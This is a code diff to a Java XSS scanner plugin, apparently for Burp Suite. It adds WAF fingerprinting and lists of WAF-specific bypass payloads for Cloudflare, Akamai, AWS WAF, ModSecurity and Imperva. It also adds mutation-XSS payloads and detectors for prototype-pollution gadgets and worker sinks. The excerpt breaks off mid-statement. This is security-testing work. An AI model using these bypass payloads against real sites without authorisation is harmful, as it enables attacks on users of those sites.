@@ -34,6 +34,78 @@ public class XssScanner implements ScanModule {
     // Framework detection cache: host → set of detected framework names
     private final ConcurrentHashMap<String, Set<String>> frameworkCachePerHost = new ConcurrentHashMap<>();
 
+    // WAF detection cache: host → detected WAF name (null = no WAF, empty = not yet probed)
+    private final ConcurrentHashMap<String, String> wafCachePerHost = new ConcurrentHashMap<>();
+
+    // WAF signatures: response body/header patterns → WAF name
+    private static final String[][] WAF_SIGNATURES = {
+            // {bodyOrHeaderPattern, WAF name, isHeaderPattern ("H" for header, "B" for body)}
+            {"cloudflare", "Cloudflare", "H"},     // Server: cloudflare
+            {"cf-ray", "Cloudflare", "H"},          // CF-Ray header
+            {"__cfduid", "Cloudflare", "H"},
+            {"akamai", "Akamai", "H"},              // Server: AkamaiGHost
+            {"akamaighost", "Akamai", "H"},
+            {"x-akamai-", "Akamai", "H"},
+            {"awselb", "AWS WAF", "H"},
+            {"x-amzn-", "AWS WAF", "H"},
+            {"aws", "AWS WAF", "H"},
+            {"x-sucuri-", "Sucuri", "H"},
+            {"sucuri", "Sucuri", "B"},
+            {"imperva", "Imperva/Incapsula", "H"},
+            {"incapsula", "Imperva/Incapsula", "H"},
+            {"x-iinfo", "Imperva/Incapsula", "H"},
+            {"visbot", "Imperva/Incapsula", "H"},
+            {"modsecurity", "ModSecurity", "H"},
+            {"mod_security", "ModSecurity", "B"},
+            {"owasp", "ModSecurity", "B"},
+            {"wordfence", "Wordfence", "B"},
+            {"f5 big-ip", "F5 BIG-IP", "H"},
+            {"bigipserver", "F5 BIG-IP", "H"},
+            {"x-cnection", "F5 BIG-IP", "H"},
+            {"barracuda", "Barracuda", "H"},
+            {"barra_counter_session", "Barracuda", "H"},
+            {"fortiweb", "Fortinet FortiWeb", "H"},
+            {"fortigate", "Fortinet FortiWeb", "H"},
+            {"wallarm", "Wallarm", "H"},
+            {"x-wallarm-", "Wallarm", "H"},
+            {"ddos-guard", "DDoS-Guard", "H"},
+            {"reblaze", "Reblaze", "H"},
+            {"rbzid", "Reblaze", "H"},
+    };
+
+    // WAF-specific bypass payloads: WAF name → extra payloads to try
+    private static final Map<String, String[][]> WAF_BYPASS_PAYLOADS = new LinkedHashMap<>();
+    static {
+        WAF_BYPASS_PAYLOADS.put("Cloudflare", new String[][]{
+                {"<svg/onload=alert`1`>", "onload=alert", "Cloudflare bypass: SVG backtick call"},
+                {"<details/open/ontoggle=confirm`1`>", "ontoggle=confirm", "Cloudflare bypass: details ontoggle"},
+                {"<img src=x onerror=alert(1)//", "onerror=alert", "Cloudflare bypass: unclosed tag"},
+                {"<svg><animate onbegin=alert(1) attributeName=x>", "onbegin=alert", "Cloudflare bypass: SVG animate"},
+        });
+        WAF_BYPASS_PAYLOADS.put("Akamai", new String[][]{
+                {"<img/src=x onerror=prompt(1)>", "onerror=prompt", "Akamai bypass: prompt instead of alert"},
+                {"<svg onload=confirm(1)>", "onload=confirm", "Akamai bypass: confirm instead of alert"},
+                {"<video><source onerror=alert(1)>", "onerror=alert", "Akamai bypass: video source"},
+                {"<details open ontoggle=alert(1)>x", "ontoggle=alert", "Akamai bypass: details ontoggle"},
+        });
+        WAF_BYPASS_PAYLOADS.put("AWS WAF", new String[][]{
+                {"<img src=x onerror=alert`1`>", "onerror=alert", "AWS WAF bypass: backtick call"},
+                {"<svg/onload=prompt(1)>", "onload=prompt", "AWS WAF bypass: prompt"},
+                {"<input autofocus onfocus=alert(1)>", "onfocus=alert", "AWS WAF bypass: autofocus"},
+        });
+        WAF_BYPASS_PAYLOADS.put("ModSecurity", new String[][]{
+                {"<svg/onload=alert`1`>", "onload=alert", "ModSecurity bypass: SVG backtick"},
+                {"<math><mtext><table><mglyph><svg><mtext><style><path id=\"</style><img src=x onerror=alert(1)>\">", "onerror=alert", "ModSecurity bypass: mXSS chain"},
+                {"<img src=x onerror=\\u0061lert(1)>", "onerror=", "ModSecurity bypass: Unicode escape in handler"},
+                {"<a href=javascript&colon;alert(1)>", "javascript", "ModSecurity bypass: HTML entity colon"},
+        });
+        WAF_BYPASS_PAYLOADS.put("Imperva/Incapsula", new String[][]{
+                {"<svg onload=alert(1)//", "onload=alert", "Imperva bypass: comment-terminated"},
+                {"<img src=x onerror=eval(atob('YWxlcnQoMSk='))>", "onerror=eval", "Imperva bypass: base64 eval"},
+                {"<details open ontoggle=alert(1)>", "ontoggle=alert", "Imperva bypass: details ontoggle"},
+        });
+    }
+
     // ==================== DOM XSS: SOURCES, SINKS, PATTERNS ====================
 
     // HIGH risk: directly user-controllable via URL
@@ -118,6 +190,15 @@ public class XssScanner implements ScanModule {
             "$(", "jQuery(",   // jQuery selector with HTML string
     };
 
+    // HIGH sinks: Service Worker / Web Worker (Improvement 8)
+    private static final String[] DOM_SINKS_WORKER = {
+            "importScripts(", "importScripts (",
+            "new Worker(", "new Worker (",
+            "new SharedWorker(", "new SharedWorker (",
+            "navigator.serviceWorker.register(",
+            "ServiceWorkerContainer.register(",
+    };
+
     // MEDIUM sinks: Framework-specific
     private static final String[] DOM_SINKS_FRAMEWORK = {
             "dangerouslySetInnerHTML",                           // React
@@ -138,6 +219,7 @@ public class XssScanner implements ScanModule {
         Collections.addAll(all, DOM_SINKS_EXEC);
         Collections.addAll(all, DOM_SINKS_HTML);
         Collections.addAll(all, DOM_SINKS_URL);
+        Collections.addAll(all, DOM_SINKS_WORKER);
         Collections.addAll(all, DOM_SINKS_JQUERY);
         Collections.addAll(all, DOM_SINKS_FRAMEWORK);
         DOM_SINKS_ALL = all.toArray(new String[0]);
@@ -152,6 +234,40 @@ public class XssScanner implements ScanModule {
     // DOM Clobbering sinks — where clobbered values become dangerous
     private static final String[] DOM_CLOBBERING_SINKS = {
             ".href", ".src", ".action", ".value", ".textContent", ".innerHTML",
+    };
+
+    // Prototype pollution source patterns — detect code that merges/extends objects unsafely
+    private static final Pattern PROTO_POLLUTION_SOURCE = Pattern.compile(
+            "(?:__proto__|constructor\\s*\\[\\s*[\"']prototype[\"']\\s*\\]|Object\\.assign\\s*\\(|"
+                    + "\\$\\.extend\\s*\\(\\s*(?:true|!0)|_\\.merge\\s*\\(|_\\.defaultsDeep\\s*\\(|"
+                    + "deepmerge\\s*\\(|deepExtend\\s*\\(|"
+                    + "JSON\\.parse\\s*\\([^)]*(?:location|document\\.URL|window\\.name|searchParams))",
+            Pattern.CASE_INSENSITIVE);
+
+    // Known prototype pollution → XSS gadgets (library, property, sink type)
+    private static final String[][] PP_XSS_GADGETS = {
+            // jQuery gadgets
+            {"jQuery", "html", ".html() sink — $.extend deep merge to jQuery options"},
+            {"jQuery", "url", ".ajax url override — $.extend deep merge"},
+            // Lodash gadgets
+            {"lodash", "template", "_.template — _.merge/_.defaultsDeep to template execution"},
+            {"lodash", "sourceURL", "_.template sourceURL — arbitrary JS via sourceURL comment"},
+            // Vue.js gadgets
+            {"Vue", "template", "Vue template option — prototype pollution to template compilation"},
+            {"Vue", "el", "Vue el option — prototype pollution to mount point hijack"},
+            {"Vue", "render", "Vue render function — prototype pollution to render override"},
+            // Sanitizer bypass gadgets
+            {"DOMPurify", "ALLOWED_TAGS", "DOMPurify config — prototype pollution to allowlist bypass"},
+            {"DOMPurify", "ADD_ATTR", "DOMPurify config — prototype pollution to allowed attributes bypass"},
+            {"DOMPurify", "ALLOW_UNKNOWN_PROTOCOLS", "DOMPurify config — prototype pollution to protocol bypass"},
+            // Generic object gadgets
+            {"Object", "innerHTML", "Direct innerHTML gadget — prototype chain to .innerHTML setter"},
+            {"Object", "outerHTML", "Direct outerHTML gadget — prototype chain to .outerHTML setter"},
+            {"Object", "srcdoc", "iframe srcdoc gadget — prototype chain to .srcdoc setter"},
+            {"Object", "src", "Script/img src gadget — prototype chain to .src setter"},
+            {"Object", "href", "Anchor/link href gadget — prototype chain to .href setter"},
+            {"Object", "data", "Object data gadget — prototype chain to .data setter"},
+            {"Object", "action", "Form action gadget — prototype chain to .action setter"},
     };
 
     // Mutation XSS patterns — innerHTML round-trip indicators (Improvement 5)
@@ -180,6 +296,17 @@ public class XssScanner implements ScanModule {
             "(?:var|let|const)\\s+(\\w+)\\s*=\\s*([^;]{1,200});", Pattern.MULTILINE);
     private static final Pattern ASSIGN_PATTERN = Pattern.compile(
             "(\\w+)\\s*=\\s*([^;=]{1,200});", Pattern.MULTILINE);
+
+    // Property chain assignment patterns: obj.prop.innerHTML = expr
+    private static final Pattern PROP_CHAIN_ASSIGN = Pattern.compile(
+            "(\\w+(?:\\.\\w+)+)\\s*=\\s*([^;=]{1,200});", Pattern.MULTILINE);
+
+    // Callback/closure patterns: .then(function(data) { ... }), .forEach(function(item) { ... })
+    private static final Pattern CALLBACK_PARAM = Pattern.compile(
+            "\\.(?:then|done|success|each|forEach|map|filter|reduce|on|bind|addEventListener)\\s*\\(\\s*"
+                    + "(?:function\\s*\\(\\s*(\\w+)|\\(\\s*(\\w+)\\s*\\)\\s*=>|"
+                    + "(\\w+)\\s*=>)",
+            Pattern.CASE_INSENSITIVE);
 
     // Regex for jQuery selector with user input
     private static final Pattern JQUERY_SELECTOR_SOURCE = Pattern.compile(
@@ -239,6 +366,8 @@ public class XssScanner implements ScanModule {
                 {"<select autofocus onfocus=alert(1)>", "<select autofocus onfocus=alert(1)>", "select autofocus"},
                 {"<textarea autofocus onfocus=alert(1)>", "<textarea autofocus onfocus=alert(1)>", "textarea autofocus"},
                 {"<math><mtext><table><mglyph><svg><mtext><textarea><path id=\"</textarea><img/src=1 onerror=alert(1)>\">", "", "Math/SVG mutation"},
+                {"<iframe srcdoc=\"&lt;img src=x onerror=alert(1)&gt;\">", "srcdoc=", "iframe srcdoc decode"},
+                {"<svg><style>{font-family:'<img/src=x onerror=alert(1)>'}", "onerror=alert", "SVG style mXSS"},
         });
         CONTEXT_PAYLOADS.put("HTML_ATTRIBUTE", new String[][]{
                 {"\" onmouseover=\"alert(1)", "onmouseover", "Attribute breakout - double quote"},
@@ -301,6 +430,20 @@ public class XssScanner implements ScanModule {
             {"<input type=hidden onfocus=alert(1) autofocus>", "onfocus=alert", "Hidden input autofocus"},
             {"<body background=javascript:alert(1)>", "javascript:", "Body background scheme (legacy)"},
             {"<link rel=import href=data:text/html,<script>alert(1)</script>>", "<script>alert", "HTML import data scheme"},
+            // Deep mutation XSS payloads — browser-specific HTML serialization quirks
+            {"<svg><style>{font-family:'<img/src=x onerror=alert(1)>'}", "onerror=alert", "mXSS: SVG style font-family parsing"},
+            {"<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>", "onerror=alert", "mXSS: MathML table mglyph style breakout"},
+            {"<svg></p><style><a id=\"</style><img src=1 onerror=alert(1)>\">", "onerror=alert", "mXSS: SVG paragraph reparse style breakout"},
+            {"<listing>&lt;img src=x onerror=alert(1)//", "onerror=alert", "mXSS: listing tag innerHTML serialization"},
+            {"<noembed><img src=x onerror=alert(1)></noembed>", "onerror=alert", "mXSS: noembed innerHTML round-trip"},
+            {"<xmp><img src=x onerror=alert(1)></xmp>", "onerror=alert", "mXSS: xmp tag content mutation"},
+            {"<svg><foreignObject><div><style></div><img src=x onerror=alert(1)>", "onerror=alert", "mXSS: SVG foreignObject namespace switch"},
+            {"<math><annotation-xml encoding=\"text/html\"><img src=x onerror=alert(1)>", "onerror=alert", "mXSS: MathML annotation-xml integration point"},
+            {"<form><math><mtext></form><form><mglyph><svg><mtext><style><path id=\"</style><img src=x onerror=alert(1)>\">", "onerror=alert", "mXSS: nested form math mglyph chain"},
+            {"<svg><desc><![CDATA[</desc><img src=x onerror=alert(1)>]]>", "onerror=alert", "mXSS: SVG CDATA section breakout"},
+            // iframe srcdoc payloads — entity-decoded by browser
+            {"<iframe srcdoc=\"&lt;script&gt;alert(1)&lt;/script&gt;\">", "srcdoc=", "iframe srcdoc entity decode bypass"},
+            {"<iframe srcdoc=\"&lt;img src=x onerror=alert(1)&gt;\">", "srcdoc=", "iframe srcdoc img onerror"},
     };
 
     // ==================== FRAMEWORK-SPECIFIC XSS PAYLOADS ====================
@@ -533,7 +676,10 @@ public class XssScanner implements ScanModule {
         }
 
         if (!contentType.contains("javascript") && !contentType.contains("text/html")
-                && !contentType.contains("application/json")) return findings;
+                && !contentType.contains("application/json")
+                && !contentType.contains("application/xhtml+xml")
+                && !contentType.contains("text/xml")
+                && !contentType.contains("application/xml")) return findings;
 
         String body;
         try {
@@ -581,6 +727,16 @@ public class XssScanner implements ScanModule {
         // 11. Mutation XSS pattern detection (Improvement 5)
         for (String script : scriptBlocks) {
             analyzeMutationXssPatterns(script, url, requestResponse, findings, reported);
+        }
+
+        // 12. Prototype pollution → XSS gadget detection
+        for (String script : scriptBlocks) {
+            analyzePrototypePollutionGadgets(script, url, requestResponse, findings, reported);
+        }
+
+        // 13. Service Worker / Web Worker sink analysis
+        for (String script : scriptBlocks) {
+            analyzeWorkerSinks(script, url, requestResponse, findings, reported);
         }
 
         return findings;
@@ -738,6 +894,83 @@ public class XssScanner implements ScanModule {
             }
             if (newTainted.isEmpty()) break;
             taintedVars.putAll(newTainted);
+        }
+
+        // Pass 2b: Track property chain assignments (obj.prop = taintedVar)
+        Matcher propChainMatcher = PROP_CHAIN_ASSIGN.matcher(script);
+        while (propChainMatcher.find()) {
+            String propChain = propChainMatcher.group(1);  // e.g., "obj.el.innerHTML"
+            String expression = propChainMatcher.group(2).trim();
+
+            // Check if the expression references a tainted variable
+            for (String tainted : taintedVars.keySet()) {
+                if (expression.matches(".*\\b" + Pattern.quote(tainted) + "\\b.*")) {
+                    // The property chain is now tainted — check if the chain ends in a sink
+                    for (String sink : DOM_SINKS_ALL) {
+                        String sinkBase = sink.replace("(", "").replace(" ", "").replace(".", "");
+                        if (propChain.contains(sinkBase) || propChain.endsWith(sink.replace("=", ""))) {
+                            String key = "propchain:" + propChain + "|" + sink;
+                            if (reported.contains(key)) continue;
+
+                            String sourceChain = taintedVars.get(tainted);
+                            boolean sanitized = isSanitized(
+                                    script.substring(Math.max(0, propChainMatcher.start() - 100),
+                                            Math.min(script.length(), propChainMatcher.end() + 100)));
+
+                            Severity sev = sanitized ? Severity.LOW : Severity.HIGH;
+
+                            findings.add(Finding.builder("xss-scanner",
+                                            "DOM XSS via Property Chain: " + sourceChain + " → "
+                                                    + tainted + " → " + propChain
+                                                    + (sanitized ? " (sanitizer detected)" : ""),
+                                            sev, sanitized ? Confidence.TENTATIVE : Confidence.TENTATIVE)
+                                    .url(url)
+                                    .evidence("Source chain: " + sourceChain
+                                            + "\nTainted variable: " + tainted
+                                            + "\nProperty chain sink: " + propChain
+                                            + (sanitized ? "\nSanitizer detected nearby" : ""))
+                                    .description("Data flows from user-controlled source '" + sourceChain
+                                            + "' through variable '" + tainted + "' into property chain '"
+                                            + propChain + "', which resolves to a dangerous sink."
+                                            + (sanitized ? " A sanitizer was detected, but verify correctness."
+                                            : " No sanitization detected in the flow."))
+                                    .remediation("Sanitize the variable '" + tainted
+                                            + "' before assigning to " + propChain + ".")
+                                    .requestResponse(reqResp)
+                                    .responseEvidence(propChain)
+                                    .build());
+                            reported.add(key);
+                            break;
+                        }
+                    }
+                    break;
+                }
+            }
+        }
+
+        // Pass 2c: Track callback parameters that receive tainted data
+        // e.g., fetch(taintedUrl).then(function(resp) { ... resp.text().then(function(data) { el.innerHTML = data }) })
+        Matcher callbackMatcher = CALLBACK_PARAM.matcher(script);
+        while (callbackMatcher.find()) {
+            String paramName = callbackMatcher.group(1);
+            if (paramName == null) paramName = callbackMatcher.group(2);
+            if (paramName == null) paramName = callbackMatcher.group(3);
+            if (paramName == null) continue;
+
+            // Check if the callback is chained from a tainted source (e.g., fetch(location.href).then(...)
+            String beforeCallback = script.substring(
+                    Math.max(0, callbackMatcher.start() - 300), callbackMatcher.start());
+            for (String tainted : taintedVars.keySet()) {
+                if (beforeCallback.contains(tainted) || beforeCallback.contains("fetch(")
+                        || beforeCallback.contains(".responseText") || beforeCallback.contains(".responseJSON")) {
+                    // The callback parameter inherits taint from the source
+                    if (!taintedVars.containsKey(paramName)) {
+                        taintedVars.put(paramName, taintedVars.getOrDefault(tainted,
+                                "callback param from tainted context") + " → callback(" + paramName + ")");
+                    }
+                    break;
+                }
+            }
         }
 
         if (taintedVars.isEmpty()) return;
@@ -1574,6 +1807,209 @@ public class XssScanner implements ScanModule {
         }
     }
 
+    // ==================== PASSIVE: PROTOTYPE POLLUTION → XSS GADGETS ====================
+
+    /**
+     * Phase 12: Prototype pollution → XSS gadget detection.
+     * Detects patterns where prototype pollution sources (deep merge, __proto__ access,
+     * JSON.parse of user input) co-exist with known XSS gadgets from popular libraries.
+     * Only reports when BOTH a pollution source AND a matching gadget/sink are found
+     * in the same script block, reducing false positives.
+     */
+    private void analyzePrototypePollutionGadgets(String script, String url, HttpRequestResponse reqResp,
+                                                   List<Finding> findings, Set<String> reported) {
+        // Step 1: Check if there's a prototype pollution source in this script
+        Matcher ppMatcher = PROTO_POLLUTION_SOURCE.matcher(script);
+        if (!ppMatcher.find()) return; // No pollution source → skip entirely
+
+        String pollutionSource = ppMatcher.group();
+
+        // Step 2: Check for known library-specific XSS gadgets
+        for (String[] gadget : PP_XSS_GADGETS) {
+            String library = gadget[0];
+            String property = gadget[1];
+            String gadgetDesc = gadget[2];
+
+            // Require the library to be present in the script
+            boolean libraryPresent;
+            switch (library) {
+                case "jQuery":
+                    libraryPresent = script.contains("jQuery") || script.contains("$.extend")
+                            || script.contains("$.ajax") || script.contains("$.fn");
+                    break;
+                case "lodash":
+                    libraryPresent = script.contains("_.merge") || script.contains("_.defaults")
+                            || script.contains("_.template") || script.contains("lodash");
+                    break;
+                case "Vue":
+                    libraryPresent = script.contains("Vue.") || script.contains("new Vue")
+                            || script.contains("createApp");
+                    break;
+                case "DOMPurify":
+                    libraryPresent = script.contains("DOMPurify");
+                    break;
+                case "Object":
+                    libraryPresent = true; // Generic — always applicable
+                    break;
+                default:
+                    libraryPresent = script.contains(library);
+                    break;
+            }
+            if (!libraryPresent) continue;
+
+            // Check if the gadget property is actually used in a sink-like pattern
+            boolean gadgetUsed;
+            if ("Object".equals(library)) {
+                // For generic gadgets, require the property to appear as a setter/assignment
+                gadgetUsed = script.contains("." + property + " =")
+                        || script.contains("." + property + "=")
+                        || script.contains("[\"" + property + "\"]")
+                        || script.contains("['" + property + "']");
+            } else {
+                gadgetUsed = script.contains(property);
+            }
+            if (!gadgetUsed) continue;
+
+            String key = "pp-gadget|" + library + "|" + property;
+            if (reported.contains(key)) continue;
+
+            // Verify proximity: pollution source and gadget usage within 2000 chars
+            int sourceIdx = ppMatcher.start();
+            int gadgetIdx = script.indexOf(property, Math.max(0, sourceIdx - 2000));
+            if (gadgetIdx < 0 || Math.abs(gadgetIdx - sourceIdx) > 2000) continue;
+
+            String context = extractContext(script, Math.min(sourceIdx, gadgetIdx),
+                    Math.max(sourceIdx + pollutionSource.length(), gadgetIdx + property.length()));
+
+            findings.add(Finding.builder("xss-scanner",
+                            "Prototype Pollution → XSS Gadget: " + library + "." + property,
+                            Severity.MEDIUM, Confidence.TENTATIVE)
+                    .url(url)
+                    .evidence("Pollution source: " + truncate(pollutionSource, 100)
+                            + "\nGadget: " + gadgetDesc
+                            + "\nLibrary: " + library
+                            + "\nContext:\n" + context)
+                    .description("A prototype pollution source (" + truncate(pollutionSource, 60)
+                            + ") was found near a known XSS gadget in " + library + ". "
+                            + "If an attacker can pollute Object.prototype." + property
+                            + ", they may achieve XSS through " + gadgetDesc + ". "
+                            + "This requires both a pollution vector (e.g., query parameter parsed into "
+                            + "a deep merge) and the gadget to be reachable.")
+                    .remediation("Freeze Object.prototype using Object.freeze(Object.prototype). "
+                            + "Use Map instead of plain objects for user-controlled data. "
+                            + "Validate merge targets with hasOwnProperty checks. "
+                            + "Use --disable-proto=throw Node.js flag if applicable.")
+                    .requestResponse(reqResp)
+                    .responseEvidence(truncate(pollutionSource, 100))
+                    .build());
+            reported.add(key);
+        }
+    }
+
+    // ==================== PASSIVE: SERVICE WORKER / WEB WORKER SINKS ====================
+
+    /**
+     * Phase 13: Service Worker and Web Worker sink analysis.
+     * Detects importScripts(), new Worker(), and serviceWorker.register() calls
+     * that use user-controllable input, which can lead to persistent XSS or
+     * arbitrary script loading.
+     */
+    private void analyzeWorkerSinks(String script, String url, HttpRequestResponse reqResp,
+                                     List<Finding> findings, Set<String> reported) {
+        for (String sink : DOM_SINKS_WORKER) {
+            int idx = -1;
+            while ((idx = script.indexOf(sink, idx + 1)) >= 0) {
+                // Extract the argument passed to the worker sink
+                String arg = extractParenContent(script, idx);
+                if (arg.isEmpty()) continue;
+
+                // Check if any DOM source appears in the argument
+                for (String source : DOM_SOURCES_ALL) {
+                    if (arg.contains(source)) {
+                        String key = "worker|" + sink + "|" + source;
+                        if (reported.contains(key)) continue;
+
+                        // Check for sanitization between source and sink
+                        String region = script.substring(Math.max(0, idx - 100),
+                                Math.min(script.length(), idx + sink.length() + arg.length() + 100));
+                        boolean sanitized = isSanitized(region);
+
+                        // For new Worker/SharedWorker: also check if URL is validated
+                        boolean urlValidated = region.contains("new URL(")
+                                || region.contains("URL.createObjectURL")
+                                || region.contains("blob:");
+
+                        Severity sev;
+                        if (sink.contains("importScripts")) {
+                            sev = sanitized ? Severity.MEDIUM : Severity.CRITICAL;
+                        } else if (sink.contains("serviceWorker")) {
+                            sev = sanitized ? Severity.MEDIUM : Severity.CRITICAL;
+                        } else {
+                            sev = sanitized ? Severity.LOW : Severity.HIGH;
+                        }
+
+                        String context = extractContext(script, idx, idx + sink.length() + arg.length());
+
+                        findings.add(Finding.builder("xss-scanner",
+                                        "DOM XSS via Worker Sink: " + sink.trim() + " with User Input"
+                                                + (sanitized ? " (validation detected)" : ""),
+                                        sev, sanitized ? Confidence.TENTATIVE : Confidence.FIRM)
+                                .url(url)
+                                .evidence("Sink: " + sink.trim()
+                                        + "\nSource in argument: " + source
+                                        + "\nArgument: " + truncate(arg, 200)
+                                        + (urlValidated ? "\nURL validation detected" : "")
+                                        + (sanitized ? "\nSanitization detected" : "")
+                                        + "\nContext:\n" + context)
+                                .description(getWorkerSinkDescription(sink, source, sanitized))
+                                .remediation(getWorkerSinkRemediation(sink))
+                                .requestResponse(reqResp)
+                                .responseEvidence(sink.trim() + truncate(arg, 60))
+                                .build());
+                        reported.add(key);
+                        break;
+                    }
+                }
+            }
+        }
+    }
+
+    private String getWorkerSinkDescription(String sink, String source, boolean sanitized) {
+        if (sink.contains("importScripts")) {
+            return "importScripts() loads and executes JavaScript from the specified URL(s). "
+                    + "User-controllable input from '" + source + "' flows into the URL argument. "
+                    + "An attacker can load arbitrary JavaScript from an external domain, "
+                    + "gaining code execution in the Worker context."
+                    + (sanitized ? " Validation was detected but should be verified." : "");
+        } else if (sink.contains("serviceWorker")) {
+            return "navigator.serviceWorker.register() installs a persistent Service Worker. "
+                    + "User-controllable input from '" + source + "' flows into the registration URL. "
+                    + "An attacker can register a malicious Service Worker that persists across sessions, "
+                    + "intercepting all network requests and achieving persistent XSS."
+                    + (sanitized ? " Validation was detected but should be verified." : "");
+        } else {
+            return "new Worker/SharedWorker() creates a Web Worker executing the specified script. "
+                    + "User-controllable input from '" + source + "' flows into the script URL. "
+                    + "An attacker can load and execute arbitrary JavaScript in a Worker context."
+                    + (sanitized ? " Validation was detected but should be verified." : "");
+        }
+    }
+
+    private String getWorkerSinkRemediation(String sink) {
+        if (sink.contains("importScripts")) {
+            return "Never pass user input to importScripts(). Use a static list of allowed script URLs. "
+                    + "Validate URLs against a strict allowlist of trusted origins.";
+        } else if (sink.contains("serviceWorker")) {
+            return "Never allow user input in Service Worker registration URLs. Use a fixed path "
+                    + "for SW scripts. Set Service-Worker-Allowed header to restrict SW scope. "
+                    + "Implement CSP with worker-src directive.";
+        } else {
+            return "Never pass user input to Worker/SharedWorker constructors. Use Blob URLs with "
+                    + "trusted code, or validate worker URLs against a strict allowlist. "
+                    + "Implement CSP with worker-src directive.";
+        }
+    }
+
     // ==================== ACTIVE: DOM XSS TESTING ====================
 
     /**
@@ -1674,6 +2110,7 @@ public class XssScanner implements ScanModule {
         for (String s : DOM_SINKS_EXEC) if (sink.equals(s)) return Severity.CRITICAL;
         for (String s : DOM_SINKS_HTML) if (sink.equals(s)) return Severity.HIGH;
         for (String s : DOM_SINKS_URL) if (sink.equals(s)) return Severity.HIGH;
+        for (String s : DOM_SINKS_WORKER) if (sink.equals(s)) return Severity.HIGH;
         for (String s : DOM_SINKS_JQUERY) if (sink.equals(s)) return Severity.MEDIUM;
         return Severity.MEDIUM;
     }
@@ -1732,6 +2169,72 @@ public class XssScanner implements ScanModule {
         int bIdx = script.indexOf(b);
         if (aIdx < 0 || bIdx < 0) return false;
         return Math.abs(aIdx - bIdx) < 500;
+    }
+
+    // ==================== WAF FINGERPRINTING ====================
+
+    /**
+     * Fingerprints the WAF protecting a host by sending a known-bad payload
+     * and analyzing the blocked response. Cached per host.
+     * Returns the WAF name, or null if no WAF detected.
+     */
+    private String fingerprintWaf(HttpRequestResponse original, XssTarget target) throws InterruptedException {
+        String host = extractHost(original.request().url());
+        if (wafCachePerHost.containsKey(host)) {
+            return wafCachePerHost.get(host);
+        }
+
+        // Send an obviously malicious payload that any WAF should block
+        String wafProbe = "<script>alert(1)</script><img src=x onerror=alert(1)>";
+        HttpRequestResponse result = sendPayload(original, target, wafProbe);
+
+        String detectedWaf = null;
+
+        if (result != null && result.response() != null) {
+            int statusCode = result.response().statusCode();
+            String body = "";
+            try {
+                body = result.response().bodyToString().toLowerCase();
+            } catch (Exception ignored) {}
+
+            // Collect all headers as lowercase string
+            StringBuilder headerBuilder = new StringBuilder();
+            for (var h : result.response().headers()) {
+                headerBuilder.append(h.name().toLowerCase()).append(": ")
+                        .append(h.value().toLowerCase()).append("\n");
+            }
+            String headers = headerBuilder.toString();
+
+            // Check known WAF signatures
+            for (String[] sig : WAF_SIGNATURES) {
+                String pattern = sig[0].toLowerCase();
+                String wafName = sig[1];
+                boolean isHeader = "H".equals(sig[2]);
+
+                if (isHeader ? headers.contains(pattern) : body.contains(pattern)) {
+                    detectedWaf = wafName;
+                    break;
+                }
+            }
+
+            // Additional heuristic: common WAF block status codes with generic bodies
+            if (detectedWaf == null && (statusCode == 403 || statusCode == 406 || statusCode == 419
+                    || statusCode == 429 || statusCode == 503)) {
+                // Check for generic block page indicators
+                if (body.contains("blocked") || body.contains("forbidden") || body.contains("security")
+                        || body.contains("firewall") || body.contains("waf") || body.contains("denied")) {
+                    detectedWaf = "Unknown WAF";
+                }
+            }
+        }
+
+        wafCachePerHost.put(host, detectedWaf);
+        if (detectedWaf != null) {
+            api.logging().logToOutput("[XSS] WAF detected for host " + host + ": " + detectedWaf);
+        } else {
+            api.logging().logToOutput("[XSS] No WAF detected for host " + host);
+        }
+        return detectedWaf;
     }
 
     // ==================== SMART CHARACTER FILTER PROBING (Improvement 1) ====================
@@ -1915,6 +2418,10 @@ public class XssScanner implements ScanModule {
                 .responseEvidence(CANARY)
                 .build());
 
+        // Step 2.5: WAF fingerprinting — identify WAF before payload spray
+        String detectedWaf = fingerprintWaf(original, target);
+        perHostDelay();
+
         // Step 3: Smart character filter probing (Improvement 1)
         Map<Character, Boolean> charSurvival = probeCharacterFiltering(original, target);
         perHostDelay();
@@ -2005,7 +2512,7 @@ public class XssScanner implements ScanModule {
 
         // Step 5: Try adaptive evasion payloads based on char survival (Improvement 1)
         if (config.getBool("xss.evasion.enabled", true)) {
-            testFilterEvasion(original, target, url, context, charSurvival, canaryBody);
+            testFilterEvasion(original, target, url, context, charSurvival, canaryBody, detectedWaf);
         }
 
         // Step 6: Client-side template injection (Improvement 2)
@@ -2038,7 +2545,60 @@ public class XssScanner implements ScanModule {
     private void testFilterEvasion(HttpRequestResponse original, XssTarget target,
                                     String url, String context,
                                     Map<Character, Boolean> charSurvival,
-                                    String canaryBody) throws InterruptedException {
+                                    String canaryBody, String detectedWaf) throws InterruptedException {
+        // Step 0: Try WAF-specific bypass payloads first (highest chance of success)
+        if (detectedWaf != null && WAF_BYPASS_PAYLOADS.containsKey(detectedWaf)) {
+            String[][] wafPayloads = WAF_BYPASS_PAYLOADS.get(detectedWaf);
+            api.logging().logToOutput("[XSS] Trying " + wafPayloads.length + " " + detectedWaf
+                    + "-specific bypass payloads for param '" + target.name + "'");
+
+            for (String[] wafPayload : wafPayloads) {
+                String payload = wafPayload[0];
+                String checkFor = wafPayload[1];
+                String technique = wafPayload[2];
+
+                if (!payloadViableWithChars(payload, charSurvival)) continue;
+
+                HttpRequestResponse result = sendPayload(original, target, payload);
+                if (result == null || result.response() == null) continue;
+
+                String body = result.response().bodyToString();
+
+                if (!checkFor.isEmpty() && body.contains(checkFor) && !canaryBody.contains(checkFor)) {
+                    ReflectionVerdict verdict = validateExecutableContext(result, payload, checkFor);
+                    if (verdict == ReflectionVerdict.ENCODED) continue;
+
+                    Severity sev = Severity.HIGH;
+                    String verdictNote = "";
+                    if (verdict == ReflectionVerdict.NON_HTML_CONTENT_TYPE) {
+                        sev = Severity.INFO;
+                        verdictNote = " | Reflected in non-HTML response";
+                    } else if (verdict == ReflectionVerdict.DEAD_CONTAINER) {
+                        sev = Severity.INFO;
+                        verdictNote = " | Reflected inside non-executable container";
+                    } else if (verdict == ReflectionVerdict.CSP_RESTRICTED) {
+                        sev = downgradeSeverity(Severity.HIGH);
+                        verdictNote = " | CSP restricts inline execution";
+                    }
+
+                    findingsStore.addFinding(Finding.builder("xss-scanner",
+                                    "XSS via WAF Bypass: " + technique,
+                                    sev, Confidence.FIRM)
+                            .url(url).parameter(target.name)
+                            .evidence("WAF detected: " + detectedWaf + " | Bypass technique: " + technique
+                                    + " | Payload: " + payload + verdictNote)
+                            .description("The " + detectedWaf + " WAF was bypassed using " + technique
